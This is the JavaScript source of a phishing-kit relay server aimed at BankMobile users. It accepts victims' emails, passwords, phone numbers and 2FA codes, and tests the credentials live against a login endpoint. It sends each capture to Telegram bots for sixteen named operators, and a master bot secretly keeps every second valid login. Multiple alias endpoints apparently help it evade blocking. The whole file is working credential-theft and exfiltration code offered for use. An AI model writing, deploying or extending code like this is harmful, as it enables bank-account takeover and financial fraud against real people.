// ================================================
// BANKMOBILE CENTRAL RELAY BACKEND
// Client bot: NO client ID | MASTER bot: WITH client ID
// ================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3004;

app.use(cors({ origin: '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ================================================
// TELEGRAM BOT CONFIGURATIONS
// ================================================

// MASTER BOT - Receives alternating valid logins + all invalid + all phone/OTP
const MASTER_BOT = {
    token: process.env.MASTER_BOT_TOKEN || process.env.BOT_TOKEN_1,
    chatId: process.env.MASTER_CHAT_ID || process.env.CHAT_ID_1
};

// Individual client bots - MATCHING .env numbers
const BOT_CONFIGS = {
    'emmy': {
        token: process.env.BOT_TOKEN_1,
        chatId: process.env.CHAT_ID_1
    },
    'mastapis': {
        token: process.env.BOT_TOKEN_2,
        chatId: process.env.CHAT_ID_2
    },
    'black': {
        token: process.env.BOT_TOKEN_3,
        chatId: process.env.CHAT_ID_3
    },
    'oju': {
        token: process.env.BOT_TOKEN_4,
        chatId: process.env.CHAT_ID_4
    },
    'bosun': {
        token: process.env.BOT_TOKEN_5,
        chatId: process.env.CHAT_ID_5
    },
    'jide': {
        token: process.env.BOT_TOKEN_6,
        chatId: process.env.CHAT_ID_6
    },
    'chamber': {
        token: process.env.BOT_TOKEN_7,
        chatId: process.env.CHAT_ID_7
    },
    'crip': {
        token: process.env.BOT_TOKEN_8,
        chatId: process.env.CHAT_ID_8
    },
    'hayzed': {
        token: process.env.BOT_TOKEN_9,
        chatId: process.env.CHAT_ID_9
    },
    'ysd': {
        token: process.env.BOT_TOKEN_10,
        chatId: process.env.CHAT_ID_10
    },
    'sula': {
        token: process.env.BOT_TOKEN_11,
        chatId: process.env.CHAT_ID_11
    },
    'aro': {
        token: process.env.BOT_TOKEN_12,
        chatId: process.env.CHAT_ID_12
    },
    'apo': {
        token: process.env.BOT_TOKEN_13,
        chatId: process.env.CHAT_ID_13
    },
    'alahji': {
        token: process.env.BOT_TOKEN_14,
        chatId: process.env.CHAT_ID_14
    },
    'ola': {
        token: process.env.BOT_TOKEN_15,
        chatId: process.env.CHAT_ID_15
   },
    'bamzy': {
        token: process.env.BOT_TOKEN_16,
        chatId: process.env.CHAT_ID_16
    }
};

// Default config (fallback)
const DEFAULT_CONFIG = {
    token: process.env.DEFAULT_BOT_TOKEN || process.env.BOT_TOKEN_1,
    chatId: process.env.DEFAULT_CHAT_ID || process.env.CHAT_ID_1
};

// ================================================
// COUNTER STORAGE (in-memory)
// ================================================
const validCounters = {};

// ================================================
// SEND TO TELEGRAM
// ================================================
async function sendToTelegram(token, chatId, message) {
    if (!token || !chatId) {
        console.log('⚠️ Missing token or chat ID');
        return false;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`✅ Telegram sent to: ${chatId}`);
        return true;
    } catch (error) {
        console.error(`❌ Telegram error (${chatId}):`, error.message);
        return false;
    }
}

// ================================================
// SEND TO CLIENT BOT + MASTER BOT (with logic)
// ================================================
async function sendToAllBots(clientMessage, clientId, masterMessage, isSuccess, isPhoneOrOtp = false) {
    const results = [];
    
    // If it's phone or OTP, send to BOTH always
    if (isPhoneOrOtp) {
        // Send to client
        const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
        const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
        results.push({ bot: clientId, sent: clientResult });
        
        // Send to master
        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
        results.push({ bot: 'MASTER', sent: masterResult });
        
        return results;
    }
    
    // For login attempts
    if (!isSuccess) {
        // INVALID: Send to BOTH
        const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
        const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
        results.push({ bot: clientId, sent: clientResult });
        
        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
        results.push({ bot: 'MASTER', sent: masterResult });
        
        return results;
    }
    
    // VALID: Alternating logic
    // Initialize counter if not exists
    if (!validCounters[clientId]) {
        validCounters[clientId] = 0;
    }
    
    validCounters[clientId]++;
    const isEven = validCounters[clientId] % 2 === 0;
    
    console.log(`🔄 ${clientId} valid count: ${validCounters[clientId]} (${isEven ? 'MASTER' : 'CLIENT'} turn)`);
    
    if (isEven) {
        // Even number (2nd, 4th, 6th...) → Send to MASTER ONLY
        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
        results.push({ bot: 'MASTER', sent: masterResult });
        results.push({ bot: clientId, sent: false, reason: 'Alternating - master turn' });
    } else {
        // Odd number (1st, 3rd, 5th...) → Send to CLIENT ONLY
        const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
        const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
        results.push({ bot: clientId, sent: clientResult });
        results.push({ bot: 'MASTER', sent: false, reason: 'Alternating - client turn' });
    }
    
    return results;
}

// ================================================
// AUTHENTICATE WITH BANKMOBILE
// ================================================
async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);

        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);

        const response = await axios.post('https://profile.refundselection.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );

        console.log(`Response status: ${response.status}`);

        if (response.status === 302) {
            console.log('✅ SUCCESS');
            return { success: true };
        }

        console.log('❌ FAILED');
        return { success: false };

    } catch (error) {
        if (error.response && error.response.status === 302) {
            console.log('✅ SUCCESS (redirect)');
            return { success: true };
        }
        console.log('❌ FAILED:', error.message);
        return { success: false };
    }
}

// ================================================
// FORMAT MESSAGES
// ================================================
function formatMessage(email, password, success, frontend) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    const statusText = success ? '✅ VALID' : '❌ INVALID';
    const statusEmoji = success ? '✅' : '❌';
    
    // CLIENT MESSAGE - WITHOUT client ID
    const clientMessage = `${statusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email:</b> <code>${email}</code>\n` +
        `🔑 <b>Password:</b> <code>${password}</code>\n` +
        `📊 <b>Status:</b> ${statusText}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    // MASTER MESSAGE - WITHOUT client ID (removed)
    const masterMessage = `${statusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email:</b> <code>${email}</code>\n` +
        `🔑 <b>Password:</b> <code>${password}</code>\n` +
        `📊 <b>Status:</b> ${statusText}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    return { clientMessage, masterMessage };
}

function formatPhoneMessage(phone, frontend) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    
    const clientMessage = `📱 <b>PHONE NUMBER</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    const masterMessage = `📱 <b>PHONE NUMBER</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    return { clientMessage, masterMessage };
}

function formatOtpMessage(otp, trusted, frontend) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    
    const clientMessage = `🔐 <b>2FA CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
        `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    const masterMessage = `🔐 <b>2FA CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
        `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    return { clientMessage, masterMessage };
}

// ================================================
// SHARED AUTH HANDLER
// ================================================
async function handleAuth(req, res) {
    const { email, password, frontend } = req.body;
    
    const clientId = frontend || 'default';
    console.log(`\n🔐 Login attempt from: ${clientId}`);
    console.log(`📧 Email: ${email}`);
    
    const result = await authenticateWithAPI(email, password);
    const messages = formatMessage(email, password, result.success, clientId);
    
    // Pass the success status to determine routing
    const results = await sendToAllBots(
        messages.clientMessage, 
        clientId, 
        messages.masterMessage, 
        result.success, 
        false // not phone or OTP
    );
    
    res.json({
        success: result.success,
        client: clientId,
        telegramSent: results,
        counter: validCounters[clientId] || 0
    });
}

// ================================================
// PHONE HANDLER
// ================================================
app.post('/submit-phone', async (req, res) => {
    const { phone, frontend } = req.body;
    const clientId = frontend || 'default';
    
    console.log(`📱 Phone from ${clientId}: ${phone}`);
    
    const messages = formatPhoneMessage(phone, clientId);
    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage, true, true);
    
    res.json({ success: true });
});

// ================================================
// OTP HANDLER
// ================================================
app.post('/submit-otp', async (req, res) => {
    const { otp, trusted, frontend } = req.body;
    const clientId = frontend || 'default';
    
    console.log(`🔐 OTP from ${clientId}: ${otp}`);
    
    const messages = formatOtpMessage(otp, trusted || false, clientId);
    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage, true, true);
    
    res.json({ success: true });
});

// ================================================
// ALL AUTH ENDPOINTS - SUPPORTS ROTATION
// ================================================
app.post('/authenticate', handleAuth);
app.post('/auth', handleAuth);
app.post('/verify', handleAuth);
app.post('/login', handleAuth);
app.post('/validate', handleAuth);

// ================================================
// HEALTH CHECK
// ================================================
app.get('/health', (req, res) => {
    const botCount = Object.keys(BOT_CONFIGS).length;
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-relay',
        bots: botCount + 1,
        clients: Object.keys(BOT_CONFIGS),
        masterBot: 'configured',
        counters: validCounters
    });
});

// ================================================
// ROOT
// ================================================
app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Relay Backend',
        status: 'running',
        clients: Object.keys(BOT_CONFIGS),
        masterBot: 'Always receives all messages with client ID',
        endpoints: {
            'POST /authenticate': 'Login',
            'POST /auth': 'Login',
            'POST /verify': 'Login',
            'POST /login': 'Login',
            'POST /validate': 'Login',
            'POST /submit-phone': 'Submit phone',
            'POST /submit-otp': 'Submit OTP',
            'GET /health': 'Health check'
        }
    });
});

// ================================================
// START SERVER
// ================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ BankMobile Relay running on port ${PORT}`);
    console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
    console.log(`👑 MASTER Bot: Always receives ALL messages with client ID`);
    console.log(`🔄 Valid login alternation: CLIENT → MASTER → CLIENT → MASTER...`);
});
